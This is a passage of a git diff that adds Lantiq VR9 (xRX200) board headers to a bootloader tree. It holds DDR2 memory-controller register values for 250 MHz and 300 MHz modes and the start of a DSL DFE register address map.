+#define	MC_CCR57_VALUE	0x7800301
+#define	MC_CCR58_VALUE	0x7800301
+#define	MC_CCR59_VALUE	0x7800301
+#define	MC_CCR60_VALUE	0x7800301
+#define	MC_CCR61_VALUE	0x4
diff --git a/board/vr9/ddr2/xrx200_ddr2_250M_lp_settings.h b/board/vr9/ddr2/xrx200_ddr2_250M_lp_settings.h
new file mode 100644
--- /dev/null
+++ b/board/vr9/ddr2/xrx200_ddr2_250M_lp_settings.h
@@ -0,0 +1,64 @@
+/* Settings for VR9 DDR2 SDRAM controller */		
+
+#define	MC_CCR00_VALUE	0x101
+#define	MC_CCR01_VALUE	0x1000101
+#define	MC_CCR02_VALUE	0x1010000
+#define	MC_CCR03_VALUE	0x100
+#define	MC_CCR04_VALUE	0x1000000
+#define	MC_CCR05_VALUE	0x1000101
+#define	MC_CCR06_VALUE	0x1000100
+#define	MC_CCR07_VALUE	0x1010000
+#define	MC_CCR08_VALUE	0x1000101
+#define	MC_CCR09_VALUE	0x0
+#define	MC_CCR10_VALUE	0x2000100
+#define	MC_CCR11_VALUE	0x2000401
+#define	MC_CCR12_VALUE	0x30000
+#define	MC_CCR13_VALUE	0x202
+#define	MC_CCR14_VALUE	0x7080A0F
+#define	MC_CCR15_VALUE	0x2040F
+#define	MC_CCR16_VALUE	0x40000
+#define	MC_CCR17_VALUE	0x70102
+#define	MC_CCR18_VALUE	0x4020002
+#define	MC_CCR19_VALUE	0x16030302
+#define	MC_CCR20_VALUE	0x8000714
+#define	MC_CCR21_VALUE	0x40F020A
+#define	MC_CCR22_VALUE	0x0
+#define	MC_CCR23_VALUE	0xC020000
+#define	MC_CCR24_VALUE	0x4401B04
+#define	MC_CCR25_VALUE	0x0
+#define	MC_CCR26_VALUE	0x0
+#define	MC_CCR27_VALUE	0x6420000
+#define	MC_CCR28_VALUE	0x0
+#define	MC_CCR29_VALUE	0x0
+#define	MC_CCR30_VALUE	0x798
+#define	MC_CCR31_VALUE	0x10000C0
+#define	MC_CCR32_VALUE	0x120040
+#define	MC_CCR33_VALUE	0x650080
+#define	MC_CCR34_VALUE	0x200C8
+#define	MC_CCR35_VALUE	0x1D445D
+#define	MC_CCR36_VALUE	0xC8
+#define	MC_CCR37_VALUE	0xC351
+#define	MC_CCR38_VALUE	0x0
+#define	MC_CCR39_VALUE	0x141F04
+#define	MC_CCR40_VALUE	0x142704
+#define	MC_CCR41_VALUE	0x141b42
+#define	MC_CCR42_VALUE	0x141b42
+#define	MC_CCR43_VALUE	0x566504
+#define	MC_CCR44_VALUE	0x566504
+#define	MC_CCR45_VALUE	0x565F17
+#define	MC_CCR46_VALUE	0x565F17
+#define	MC_CCR47_VALUE	0x0
+#define	MC_CCR48_VALUE	0x0
+#define	MC_CCR49_VALUE	0x0
+#define	MC_CCR50_VALUE	0x0
+#define	MC_CCR51_VALUE	0x0
+#define	MC_CCR52_VALUE	0x133
+#define	MC_CCR53_VALUE	0xF3004B27
+#define	MC_CCR54_VALUE	0xF3004B27
+#define	MC_CCR55_VALUE	0xF3004B27
+#define	MC_CCR56_VALUE	0xF3004B27
+#define	MC_CCR57_VALUE	0x7800301
+#define	MC_CCR58_VALUE	0x7800301
+#define	MC_CCR59_VALUE	0x7800301
+#define	MC_CCR60_VALUE	0x7800301
+#define	MC_CCR61_VALUE	0x4
diff --git a/board/vr9/ddr2/xrx200_ddr2_250M_settings.h b/board/vr9/ddr2/xrx200_ddr2_250M_settings.h
new file mode 100644
--- /dev/null
+++ b/board/vr9/ddr2/xrx200_ddr2_250M_settings.h
@@ -0,0 +1,64 @@
+/* Settings for VR9 DDR2 SDRAM controller */		
+
+#define	MC_CCR00_VALUE	0x101
+#define	MC_CCR01_VALUE	0x1000101
+#define	MC_CCR02_VALUE	0x1010000
+#define	MC_CCR03_VALUE	0x100
+#define	MC_CCR04_VALUE	0x1000000
+#define	MC_CCR05_VALUE	0x1000101
+#define	MC_CCR06_VALUE	0x1000100
+#define	MC_CCR07_VALUE	0x1010000
+#define	MC_CCR08_VALUE	0x1000101
+#define	MC_CCR09_VALUE	0x0
+#define	MC_CCR10_VALUE	0x2000100
+#define	MC_CCR11_VALUE	0x2000401
+#define	MC_CCR12_VALUE	0x30000
+#define	MC_CCR13_VALUE	0x202
+#define	MC_CCR14_VALUE	0x7080A0F
+#define	MC_CCR15_VALUE	0x2040F
+#define	MC_CCR16_VALUE	0x40000
+#define	MC_CCR17_VALUE	0x70102
+#define	MC_CCR18_VALUE	0x4020002
+#define	MC_CCR19_VALUE	0x30302
+#define	MC_CCR20_VALUE	0x8000700
+#define	MC_CCR21_VALUE	0x40F020A
+#define	MC_CCR22_VALUE	0x0
+#define	MC_CCR23_VALUE	0xC020000
+#define	MC_CCR24_VALUE	0x4401B04
+#define	MC_CCR25_VALUE	0x0
+#define	MC_CCR26_VALUE	0x0
+#define	MC_CCR27_VALUE	0x6420000
+#define	MC_CCR28_VALUE	0x0
+#define	MC_CCR29_VALUE	0x0
+#define	MC_CCR30_VALUE	0x798
+#define	MC_CCR31_VALUE	0x0
+#define	MC_CCR32_VALUE	0x0
+#define	MC_CCR33_VALUE	0x650000
+#define	MC_CCR34_VALUE	0x200C8
+#define	MC_CCR35_VALUE	0x1D445D
+#define	MC_CCR36_VALUE	0xC8
+#define	MC_CCR37_VALUE	0xC351
+#define	MC_CCR38_VALUE	0x0
+#define	MC_CCR39_VALUE	0x141F20
+#define	MC_CCR40_VALUE	0x142720
+#define	MC_CCR41_VALUE	0x141b42
+#define	MC_CCR42_VALUE	0x141b42
+#define	MC_CCR43_VALUE	0x566501
+#define	MC_CCR44_VALUE	0x566501
+#define	MC_CCR45_VALUE	0x565F17
+#define	MC_CCR46_VALUE	0x565F17
+#define	MC_CCR47_VALUE	0x0
+#define	MC_CCR48_VALUE	0x0
+#define	MC_CCR49_VALUE	0x0
+#define	MC_CCR50_VALUE	0x0
+#define	MC_CCR51_VALUE	0x0
+#define	MC_CCR52_VALUE	0x133
+#define	MC_CCR53_VALUE	0xF3004B27
+#define	MC_CCR54_VALUE	0xF3004B27
+#define	MC_CCR55_VALUE	0xF3004B27
+#define	MC_CCR56_VALUE	0xF3004B27
+#define	MC_CCR57_VALUE	0x7800301
+#define	MC_CCR58_VALUE	0x7800301
+#define	MC_CCR59_VALUE	0x7800301
+#define	MC_CCR60_VALUE	0x7800301
+#define	MC_CCR61_VALUE	0x4
diff --git a/board/vr9/ddr2/xrx200_ddr2_300M_lp_settings.h b/board/vr9/ddr2/xrx200_ddr2_300M_lp_settings.h
new file mode 100644
--- /dev/null
+++ b/board/vr9/ddr2/xrx200_ddr2_300M_lp_settings.h
@@ -0,0 +1,64 @@
+/* Settings for VR9 DDR2 SDRAM controller */		
+
+#define	MC_CCR00_VALUE	0x101
+#define	MC_CCR01_VALUE	0x1000101
+#define	MC_CCR02_VALUE	0x1010000
+#define	MC_CCR03_VALUE	0x100
+#define	MC_CCR04_VALUE	0x1000000
+#define	MC_CCR05_VALUE	0x1000101
+#define	MC_CCR06_VALUE	0x1000100
+#define	MC_CCR07_VALUE	0x1010000
+#define	MC_CCR08_VALUE	0x1000101
+#define	MC_CCR09_VALUE	0x0
+#define	MC_CCR10_VALUE	0x2000100
+#define	MC_CCR11_VALUE	0x2000401
+#define	MC_CCR12_VALUE	0x30000
+#define	MC_CCR13_VALUE	0x303
+#define	MC_CCR14_VALUE	0x7080A0F
+#define	MC_CCR15_VALUE	0x2040F
+#define	MC_CCR16_VALUE	0x40000
+#define	MC_CCR17_VALUE	0x70102
+#define	MC_CCR18_VALUE	0x5020002
+#define	MC_CCR19_VALUE	0x16030303
+#define	MC_CCR20_VALUE	0xA000714
+#define	MC_CCR21_VALUE	0x512020C
+#define	MC_CCR22_VALUE	0x0
+#define	MC_CCR23_VALUE	0xE020000
+#define	MC_CCR24_VALUE	0x4402005
+#define	MC_CCR25_VALUE	0x0
+#define	MC_CCR26_VALUE	0x0
+#define	MC_CCR27_VALUE	0x8420000
+#define	MC_CCR28_VALUE	0x0
+#define	MC_CCR29_VALUE	0x0
+#define	MC_CCR30_VALUE	0x91C
+#define	MC_CCR31_VALUE	0x10000C0
+#define	MC_CCR32_VALUE	0x120040
+#define	MC_CCR33_VALUE	0x790080
+#define	MC_CCR34_VALUE	0x200C8
+#define	MC_CCR35_VALUE	0x235209
+#define	MC_CCR36_VALUE	0xC8
+#define	MC_CCR37_VALUE	0xEA61
+#define	MC_CCR38_VALUE	0x0
+#define	MC_CCR39_VALUE	0x141F04
+#define	MC_CCR40_VALUE	0x142704
+#define	MC_CCR41_VALUE	0x141b42
+#define	MC_CCR42_VALUE	0x141b42
+#define	MC_CCR43_VALUE	0x566504
+#define	MC_CCR44_VALUE	0x566504
+#define	MC_CCR45_VALUE	0x565F17
+#define	MC_CCR46_VALUE	0x565F17
+#define	MC_CCR47_VALUE	0x0
+#define	MC_CCR48_VALUE	0x0
+#define	MC_CCR49_VALUE	0x0
+#define	MC_CCR50_VALUE	0x0
+#define	MC_CCR51_VALUE	0x0
+#define	MC_CCR52_VALUE	0x133
+#define	MC_CCR53_VALUE	0xF4003B27
+#define	MC_CCR54_VALUE	0xF4003B27
+#define	MC_CCR55_VALUE	0xF4003B27
+#define	MC_CCR56_VALUE	0xF4003B27
+#define	MC_CCR57_VALUE	0x7800301
+#define	MC_CCR58_VALUE	0x7800301
+#define	MC_CCR59_VALUE	0x7800301
+#define	MC_CCR60_VALUE	0x7800301
+#define	MC_CCR61_VALUE	0x5
diff --git a/board/vr9/ddr2/xrx200_ddr2_300M_settings.h b/board/vr9/ddr2/xrx200_ddr2_300M_settings.h
new file mode 100644
--- /dev/null
+++ b/board/vr9/ddr2/xrx200_ddr2_300M_settings.h
@@ -0,0 +1,64 @@
+/* Settings for VR9 DDR2 SDRAM controller */		
+		
+#define	MC_CCR00_VALUE	0x101
+#define	MC_CCR01_VALUE	0x1000100
+#define	MC_CCR02_VALUE	0x1010000
+#define	MC_CCR03_VALUE	0x100
+#define	MC_CCR04_VALUE	0x1000000
+#define	MC_CCR05_VALUE	0x1000101
+#define	MC_CCR06_VALUE	0x1000100
+#define	MC_CCR07_VALUE	0x1010000
+#define	MC_CCR08_VALUE	0x1000101
+#define	MC_CCR09_VALUE	0x0
+#define	MC_CCR10_VALUE	0x2000100
+#define	MC_CCR11_VALUE	0x2000501
+#define	MC_CCR12_VALUE	0x30000
+#define	MC_CCR13_VALUE	0x303
+#define	MC_CCR14_VALUE	0x90A0A0F
+#define	MC_CCR15_VALUE	0x2040F
+#define	MC_CCR16_VALUE	0x50000
+#define	MC_CCR17_VALUE	0x70102
+#define	MC_CCR18_VALUE	0x5020002
+#define	MC_CCR19_VALUE	0x40403
+#define	MC_CCR20_VALUE	0xA000700
+#define	MC_CCR21_VALUE	0x512020C
+#define	MC_CCR22_VALUE	0x0
+#define	MC_CCR23_VALUE	0xE020000
+#define	MC_CCR24_VALUE	0x4402005
+#define	MC_CCR25_VALUE	0x0
+#define	MC_CCR26_VALUE	0x0
+#define	MC_CCR27_VALUE	0x8520000
+#define	MC_CCR28_VALUE	0x0
+#define	MC_CCR29_VALUE	0x0
+#define	MC_CCR30_VALUE	0x91C
+#define	MC_CCR31_VALUE	0x0
+#define	MC_CCR32_VALUE	0x0
+#define	MC_CCR33_VALUE	0x790000
+#define	MC_CCR34_VALUE	0x200C8
+#define	MC_CCR35_VALUE	0x235209
+#define	MC_CCR36_VALUE	0xC8
+#define	MC_CCR37_VALUE	0xEA61
+#define	MC_CCR38_VALUE	0x0
+#define	MC_CCR39_VALUE	0x141F04
+#define	MC_CCR40_VALUE	0x142704
+#define	MC_CCR41_VALUE	0x141b42
+#define	MC_CCR42_VALUE	0x141b42
+#define	MC_CCR43_VALUE	0x566504
+#define	MC_CCR44_VALUE	0x566504
+#define	MC_CCR45_VALUE	0x565F17
+#define	MC_CCR46_VALUE	0x565F17
+#define	MC_CCR47_VALUE	0x0
+#define	MC_CCR48_VALUE	0x0
+#define	MC_CCR49_VALUE	0x0
+#define	MC_CCR50_VALUE	0x0
+#define	MC_CCR51_VALUE	0x0
+#define	MC_CCR52_VALUE	0x133
+#define	MC_CCR53_VALUE	0xF4003B27
+#define	MC_CCR54_VALUE	0xF4003B27
+#define	MC_CCR55_VALUE	0xF4003B27
+#define	MC_CCR56_VALUE	0xF4003B27
+#define	MC_CCR57_VALUE	0x7800301
+#define	MC_CCR58_VALUE	0x7800301
+#define	MC_CCR59_VALUE	0x7800301
+#define	MC_CCR60_VALUE	0x7800301
+#define	MC_CCR61_VALUE	0x5
diff --git a/board/vr9/dsl_address_define.h b/board/vr9/dsl_address_define.h
new file mode 100644
--- /dev/null
+++ b/board/vr9/dsl_address_define.h
@@ -0,0 +1,4700 @@
+//-----------------------------------------------------------------------------
+//
+// DSL DFE Address Definition
+//
+// Change log:
+// Updated to 03-march-2009 release from AWARE
+// 23-04-09: gck : Updated to 17-April-2009 release from AWARE
+// 15-06-09: gck : Updated to 12-June-2009 release from AWARE
+//        delta(masks): D_XDMA0_SA_E, D_XDMA1_SA_E, 
+//                      ZT_ILV_PARAMS0, ZT_ILV_PARAMS1
+//                      ZR_ILV_PARAMS0, ZR_ILV_PARAMS1
+//        new         : Z_PRAM_STATUS, qt_fdqasph(memory def)                     
+//                 
+//-----------------------------------------------------------------------------
+
+#ifndef __DSL_DFE_ADDRESS_DEFINE__
+#define __DSL_DFE_ADDRESS_DEFINE__
+
+#define MEI_OFFSET 0xBE116000 // This is for the MEI Interface
+#define DSL_OFFSET 0xBE800000 // This is for the FPI SLAVE to AWARE DFE
+#define MEIAD(a) ((a)+MEI_OFFSET)
+#define FPIAD(a) ((((a)&0x300000)>>1)+((a)&0xFFFFF)+DSL_OFFSET)
+
+/* AEC Global Address Constants */
+#define aec_global_base       (0x20D000)
+#define AEC_GLOBAL(r)         (int)(aec_global_base+(r))
+#define aec_global_size       (0x0100)
+
+#define AEC_PROG_DLY_CTRL                        AEC_GLOBAL(0x00)
+#define AEC_PROG_DLY_CTRL_WMASK                  (0x000000f3)
+#define AEC_PROG_DLY_CTRL_MASK                   (0x000000f3)
+#define AEC_PROG_DLY_CTRL_DEFAULT                (0x00000001)
+#define AEC_PROG_DLY_CTRL_FMASK                  (0x000000f3)
+#define AEC_PROG_FIR_CTRL                        AEC_GLOBAL(0x04)
+#define AEC_PROG_FIR_CTRL_WMASK                  (0x00003f13)
+#define AEC_PROG_FIR_CTRL_MASK                   (0x00003f13)
+#define AEC_PROG_FIR_CTRL_DEFAULT                (0x00000001)
+#define AEC_PROG_FIR_CTRL_FMASK                  (0x00003f13)
+#define AEC_HP_CTRL                              AEC_GLOBAL(0x08)
+#define AEC_HP_CTRL_WMASK                        (0x00000f13)
+#define AEC_HP_CTRL_MASK                         (0x00000f13)
+#define AEC_HP_CTRL_DEFAULT                      (0x00000601)
+#define AEC_HP_CTRL_FMASK                        (0x00000f13)
+#define AEC_STATUS                               AEC_GLOBAL(0x0C)
+#define AEC_STATUS_WMASK                         (0x00010101)
+#define AEC_STATUS_MASK                          (0x00010101)
+#define AEC_STATUS_DEFAULT                       (0x00000000)
+#define AEC_STATUS_FMASK                         (0x00010101)
+#define AEC_PROG_FIR_COEFF_3_0                   AEC_GLOBAL(0x10)
+#define AEC_PROG_FIR_COEFF_3_0_WMASK             (0xffffffff)
+#define AEC_PROG_FIR_COEFF_3_0_MASK              (0xffffffff)
+#define AEC_PROG_FIR_COEFF_3_0_DEFAULT           (0x00000000)
+#define AEC_PROG_FIR_COEFF_3_0_FMASK             (0xffffffff)
+#define AEC_PROG_FIR_COEFF_7_4                   AEC_GLOBAL(0x14)
+#define AEC_PROG_FIR_COEFF_7_4_WMASK             (0xffffffff)
+#define AEC_PROG_FIR_COEFF_7_4_MASK              (0xffffffff)
+#define AEC_PROG_FIR_COEFF_7_4_DEFAULT           (0x00000000)
+#define AEC_PROG_FIR_COEFF_7_4_FMASK             (0xffffffff)
+#define AEC_PROG_FIR_COEFF_B_8                   AEC_GLOBAL(0x18)
+#define AEC_PROG_FIR_COEFF_B_8_WMASK             (0xffffffff)
+#define AEC_PROG_FIR_COEFF_B_8_MASK              (0xffffffff)
+#define AEC_PROG_FIR_COEFF_B_8_DEFAULT           (0x00000000)
+#define AEC_PROG_FIR_COEFF_B_8_FMASK             (0xffffffff)
+#define AEC_PROG_FIR_COEFF_F_C                   AEC_GLOBAL(0x1C)
+#define AEC_PROG_FIR_COEFF_F_C_WMASK             (0xffffffff)
+#define AEC_PROG_FIR_COEFF_F_C_MASK              (0xffffffff)
+#define AEC_PROG_FIR_COEFF_F_C_DEFAULT           (0x00000000)
+#define AEC_PROG_FIR_COEFF_F_C_FMASK             (0xffffffff)
+#define AEC_AFIR_CTRL                            AEC_GLOBAL(0x000024)
+#define AEC_AFIR_CTRL_WMASK                      (0x000000ff)
+#define AEC_AFIR_CTRL_MASK                       (0x000000ff)
+#define AEC_AFIR_CTRL_DEFAULT                    (0x00000000)
+#define AEC_AFIR_CTRL_FMASK                      (0x000000ff)
+#define AEC_AFIR_CFG                             AEC_GLOBAL(0x000028)
+#define AEC_AFIR_CFG_WMASK                       (0x000001ff)
+#define AEC_AFIR_CFG_MASK                        (0x000001ff)
+#define AEC_AFIR_CFG_DEFAULT                     (0x00000080)
+#define AEC_AFIR_CFG_FMASK                       (0x000001ff)
+#define AEC_AFIR_CFRD                            AEC_GLOBAL(0x00002C)
+#define AEC_AFIR_CFRD_WMASK                      (0x0000ffff)
+#define AEC_AFIR_CFRD_MASK                       (0x0000ffff)
+#define AEC_AFIR_CFRD_DEFAULT                    (0x00000000)
+#define AEC_AFIR_CFRD_FMASK                      (0x0000ffff)
+#define AEC_AFIR_CFWR                            AEC_GLOBAL(0x000030)
+#define AEC_AFIR_CFWR_WMASK                      (0x0000ffff)
+#define AEC_AFIR_CFWR_MASK                       (0x0000ffff)
+#define AEC_AFIR_CFWR_DEFAULT                    (0x00000000)
+#define AEC_AFIR_CFWR_FMASK                      (0x0000ffff)
+#define AEC_AFIR_CFADDR                          AEC_GLOBAL(0x000034)
+#define AEC_AFIR_CFADDR_WMASK                    (0x000000ff)
+#define AEC_AFIR_CFADDR_MASK                     (0x000000ff)
+#define AEC_AFIR_CFADDR_DEFAULT                  (0x00000000)
+#define AEC_AFIR_CFADDR_FMASK                    (0x000000ff)
+#define AEC_AFIR_MDLLCTL                         AEC_GLOBAL(0x000038)
+#define AEC_AFIR_MDLLCTL_WMASK                   (0x0000000f)
+#define AEC_AFIR_MDLLCTL_MASK                    (0x0000000f)
+#define AEC_AFIR_MDLLCTL_DEFAULT                 (0x00000007)
+#define AEC_AFIR_MDLLCTL_FMASK                   (0x0000000f)
+#define AEC_AFIR_MDLLSTAT                        AEC_GLOBAL(0x00003C)
+#define AEC_AFIR_MDLLSTAT_WMASK                  (0x00000001)
+#define AEC_AFIR_MDLLSTAT_MASK                   (0x00000001)
+#define AEC_AFIR_MDLLSTAT_DEFAULT                (0x00000000)
+#define AEC_AFIR_MDLLSTAT_FMASK                  (0x00000001)
+#define AEC_AFIR_CTRL2                           AEC_GLOBAL(0x000040)
+#define AEC_AFIR_CTRL2_WMASK                     (0x00000003)
+#define AEC_AFIR_CTRL2_MASK                      (0x00000003)
+#define AEC_AFIR_CTRL2_DEFAULT                   (0x00000000)
+#define AEC_AFIR_CTRL2_FMASK                     (0x00000003)
+#define AEC_AFIR_CNT_UPDATE                      AEC_GLOBAL(0x000044)
+#define AEC_AFIR_CNT_UPDATE_WMASK                (0x000000ff)
+#define AEC_AFIR_CNT_UPDATE_MASK                 (0x000000ff)
+#define AEC_AFIR_CNT_UPDATE_DEFAULT              (0x00000000)
+#define AEC_AFIR_CNT_UPDATE_FMASK                (0x000000ff)
+#define AEC_AFIR_CNT_LEAKY                       AEC_GLOBAL(0x000048)
+#define AEC_AFIR_CNT_LEAKY_WMASK                 (0x0000ffff)
+#define AEC_AFIR_CNT_LEAKY_MASK                  (0x0000ffff)
+#define AEC_AFIR_CNT_LEAKY_DEFAULT               (0x00000000)
+#define AEC_AFIR_CNT_LEAKY_FMASK                 (0x0000ffff)
+#define AEC_AFIR_CNT_STOP                        AEC_GLOBAL(0x00004C)
+#define AEC_AFIR_CNT_STOP_WMASK                  (0x0000ffff)
+#define AEC_AFIR_CNT_STOP_MASK                   (0x0000ffff)
+#define AEC_AFIR_CNT_STOP_DEFAULT                (0x00000000)
+#define AEC_AFIR_CNT_STOP_FMASK                  (0x0000ffff)
+
+
+/* DREG Global Address Constants */
+#define dreg_global_base       (0x20D400)
+#define DREG_GLOBAL(r)         (int)(dreg_global_base+(r))
+#define dreg_global_size       (0x0400)
+
+#define DREG_AT_CFG0                             DREG_GLOBAL(0x0080)
+#define DREG_AT_CFG0_WMASK                       (0x0007ffff)
+#define DREG_AT_CFG0_MASK                        (0x0007ffff)
+#define DREG_AT_CFG0_DEFAULT                     (0x00000000)
+#define DREG_AT_CFG0_FMASK                       (0x0007ffff)
+#define DREG_AT_CFG1                             DREG_GLOBAL(0x0084)
+#define DREG_AT_CFG1_WMASK                       (0x0007ffff)
+#define DREG_AT_CFG1_MASK                        (0x0007ffff)
+#define DREG_AT_CFG1_DEFAULT                     (0x00000000)
+#define DREG_AT_CFG1_FMASK                       (0x0007ffff)
+#define DREG_AT_CELL0                            DREG_GLOBAL(0x0090)
+#define DREG_AT_CELL0_WMASK                      (0xffffffff)
+#define DREG_AT_CELL0_MASK                       (0xffffffff)
+#define DREG_AT_CELL0_DEFAULT                    (0x00000000)
+#define DREG_AT_CELL0_FMASK                      (0xffffffff)
+#define DREG_AT_CELL1                            DREG_GLOBAL(0x0094)
+#define DREG_AT_CELL1_WMASK                      (0xffffffff)
+#define DREG_AT_CELL1_MASK                       (0xffffffff)
+#define DREG_AT_CELL1_DEFAULT                    (0x00000000)
+#define DREG_AT_CELL1_FMASK                      (0xffffffff)
+#define DREG_AT_IDLE_CNT0                        DREG_GLOBAL(0x0098)
+#define DREG_AT_IDLE_CNT0_WMASK                  (0xffffffff)
+#define DREG_AT_IDLE_CNT0_MASK                   (0xffffffff)
+#define DREG_AT_IDLE_CNT0_DEFAULT                (0x00000000)
+#define DREG_AT_IDLE_CNT0_FMASK                  (0xffffffff)
+#define DREG_AT_IDLE_CNT1                        DREG_GLOBAL(0x009c)
+#define DREG_AT_IDLE_CNT1_WMASK                  (0xffffffff)
+#define DREG_AT_IDLE_CNT1_MASK                   (0xffffffff)
+#define DREG_AT_IDLE_CNT1_DEFAULT                (0x00000000)
+#define DREG_AT_IDLE_CNT1_FMASK                  (0xffffffff)
+#define DREG_AT_IDLE0                            DREG_GLOBAL(0x00a0)
+#define DREG_AT_IDLE0_WMASK                      (0x000000ff)
+#define DREG_AT_IDLE0_MASK                       (0x000000ff)
+#define DREG_AT_IDLE0_DEFAULT                    (0x0000006A)
+#define DREG_AT_IDLE0_FMASK                      (0x000000ff)
+#define DREG_AT_IDLE1                            DREG_GLOBAL(0x00a4)
+#define DREG_AT_IDLE1_WMASK                      (0x000000ff)
+#define DREG_AT_IDLE1_MASK                       (0x000000ff)
+#define DREG_AT_IDLE1_DEFAULT                    (0x0000006A)
+#define DREG_AT_IDLE1_FMASK                      (0x000000ff)
+#define DREG_AR_CFG0                             DREG_GLOBAL(0x0180)
+#define DREG_AR_CFG0_WMASK                       (0x0007ffff)
+#define DREG_AR_CFG0_MASK                        (0x0007ffff)
+#define DREG_AR_CFG0_DEFAULT                     (0x00000000)
+#define DREG_AR_CFG0_FMASK                       (0x0007ffff)
+#define DREG_AR_CFG1                             DREG_GLOBAL(0x0184)
+#define DREG_AR_CFG1_WMASK                       (0x0007ffff)
+#define DREG_AR_CFG1_MASK                        (0x0007ffff)
+#define DREG_AR_CFG1_DEFAULT                     (0x00000000)
+#define DREG_AR_CFG1_FMASK                       (0x0007ffff)
+#define DREG_AR_STAT0                            DREG_GLOBAL(0x0198)
+#define DREG_AR_STAT0_WMASK                      (0x0000003f)
+#define DREG_AR_STAT0_MASK                       (0x0000003f)
+#define DREG_AR_STAT0_DEFAULT                    (0x00000000)
+#define DREG_AR_STAT0_FMASK                      (0x0000003f)
+#define DREG_AR_STAT1                            DREG_GLOBAL(0x019c)
+#define DREG_AR_STAT1_WMASK                      (0x0000003f)
+#define DREG_AR_STAT1_MASK                       (0x0000003f)
+#define DREG_AR_STAT1_DEFAULT                    (0x00000000)
+#define DREG_AR_STAT1_FMASK                      (0x0000003f)
+#define DREG_AR_CELL0                            DREG_GLOBAL(0x01a0)
+#define DREG_AR_CELL0_WMASK                      (0xffffffff)
+#define DREG_AR_CELL0_MASK                       (0xffffffff)
+#define DREG_AR_CELL0_DEFAULT                    (0x00000000)
+#define DREG_AR_CELL0_FMASK                      (0xffffffff)
+#define DREG_AR_CELL1                            DREG_GLOBAL(0x01a4)
+#define DREG_AR_CELL1_WMASK                      (0xffffffff)
+#define DREG_AR_CELL1_MASK                       (0xffffffff)
+#define DREG_AR_CELL1_DEFAULT                    (0x00000000)
+#define DREG_AR_CELL1_FMASK                      (0xffffffff)
+#define DREG_AR_IDLE_CNT0                        DREG_GLOBAL(0x01a8)
+#define DREG_AR_IDLE_CNT0_WMASK                  (0xffffffff)
+#define DREG_AR_IDLE_CNT0_MASK                   (0xffffffff)
+#define DREG_AR_IDLE_CNT0_DEFAULT                (0x00000000)
+#define DREG_AR_IDLE_CNT0_FMASK                  (0xffffffff)
+#define DREG_AR_IDLE_CNT1                        DREG_GLOBAL(0x01ac)
+#define DREG_AR_IDLE_CNT1_WMASK                  (0xffffffff)
+#define DREG_AR_IDLE_CNT1_MASK                   (0xffffffff)
+#define DREG_AR_IDLE_CNT1_DEFAULT                (0x00000000)
+#define DREG_AR_IDLE_CNT1_FMASK                  (0xffffffff)
+#define DREG_AR_AIIDLE_CNT0                      DREG_GLOBAL(0x01b0)
+#define DREG_AR_AIIDLE_CNT0_WMASK                (0xffffffff)
+#define DREG_AR_AIIDLE_CNT0_MASK                 (0xffffffff)
+#define DREG_AR_AIIDLE_CNT0_DEFAULT              (0x00000000)
+#define DREG_AR_AIIDLE_CNT0_FMASK                (0xffffffff)
+#define DREG_AR_AIIDLE_CNT1                      DREG_GLOBAL(0x01b4)
+#define DREG_AR_AIIDLE_CNT1_WMASK                (0xffffffff)
+#define DREG_AR_AIIDLE_CNT1_MASK                 (0xffffffff)
+#define DREG_AR_AIIDLE_CNT1_DEFAULT              (0x00000000)
+#define DREG_AR_AIIDLE_CNT1_FMASK                (0xffffffff)
+#define DREG_AR_BE_CNT0                          DREG_GLOBAL(0x01b8)
+#define DREG_AR_BE_CNT0_WMASK                    (0xffffffff)
+#define DREG_AR_BE_CNT0_MASK                     (0xffffffff)
+#define DREG_AR_BE_CNT0_DEFAULT                  (0x00000000)
+#define DREG_AR_BE_CNT0_FMASK                    (0xffffffff)
+#define DREG_AR_BE_CNT1                          DREG_GLOBAL(0x01bc)
+#define DREG_AR_BE_CNT1_WMASK                    (0xffffffff)
+#define DREG_AR_BE_CNT1_MASK                     (0xffffffff)
+#define DREG_AR_BE_CNT1_DEFAULT                  (0x00000000)
+#define DREG_AR_BE_CNT1_FMASK                    (0xffffffff)
+#define DREG_AR_HEC_CNT0                         DREG_GLOBAL(0x01c0)
+#define DREG_AR_HEC_CNT0_WMASK                   (0xffffffff)
+#define DREG_AR_HEC_CNT0_MASK                    (0xffffffff)
+#define DREG_AR_HEC_CNT0_DEFAULT                 (0x00000000)
+#define DREG_AR_HEC_CNT0_FMASK                   (0xffffffff)
+#define DREG_AR_HEC_CNT1                         DREG_GLOBAL(0x01c4)
+#define DREG_AR_HEC_CNT1_WMASK                   (0xffffffff)
+#define DREG_AR_HEC_CNT1_MASK                    (0xffffffff)
+#define DREG_AR_HEC_CNT1_DEFAULT                 (0x00000000)
+#define DREG_AR_HEC_CNT1_FMASK                   (0xffffffff)
+#define DREG_AR_CD_CNT0                          DREG_GLOBAL(0x01c8)
+#define DREG_AR_CD_CNT0_WMASK                    (0xffffffff)
+#define DREG_AR_CD_CNT0_MASK                     (0xffffffff)
+#define DREG_AR_CD_CNT0_DEFAULT                  (0x00000000)
+#define DREG_AR_CD_CNT0_FMASK                    (0xffffffff)
+#define DREG_AR_CD_CNT1                          DREG_GLOBAL(0x01cc)
+#define DREG_AR_CD_CNT1_WMASK                    (0xffffffff)
+#define DREG_AR_CD_CNT1_MASK                     (0xffffffff)
+#define DREG_AR_CD_CNT1_DEFAULT                  (0x00000000)
+#define DREG_AR_CD_CNT1_FMASK                    (0xffffffff)
+#define DREG_AR_IDLE0                            DREG_GLOBAL(0x01d0)
+#define DREG_AR_IDLE0_WMASK                      (0x000000ff)
+#define DREG_AR_IDLE0_MASK                       (0x000000ff)
+#define DREG_AR_IDLE0_DEFAULT                    (0x0000006A)
+#define DREG_AR_IDLE0_FMASK                      (0x000000ff)
+#define DREG_AR_IDLE1                            DREG_GLOBAL(0x01d4)
+#define DREG_AR_IDLE1_WMASK                      (0x000000ff)
+#define DREG_AR_IDLE1_MASK                       (0x000000ff)
+#define DREG_AR_IDLE1_DEFAULT                    (0x0000006A)
+#define DREG_AR_IDLE1_FMASK                      (0x000000ff)
+#define DREG_AR_DELIN0                           DREG_GLOBAL(0x01d8)
+#define DREG_AR_DELIN0_WMASK                     (0x000000ff)
+#define DREG_AR_DELIN0_MASK                      (0x000000ff)
+#define DREG_AR_DELIN0_DEFAULT                   (0x00000011)
+#define DREG_AR_DELIN0_FMASK                     (0x000000ff)
+#define DREG_AR_DELIN1                           DREG_GLOBAL(0x01dc)
+#define DREG_AR_DELIN1_WMASK                     (0x000000ff)
+#define DREG_AR_DELIN1_MASK                      (0x000000ff)
+#define DREG_AR_DELIN1_DEFAULT                   (0x00000011)
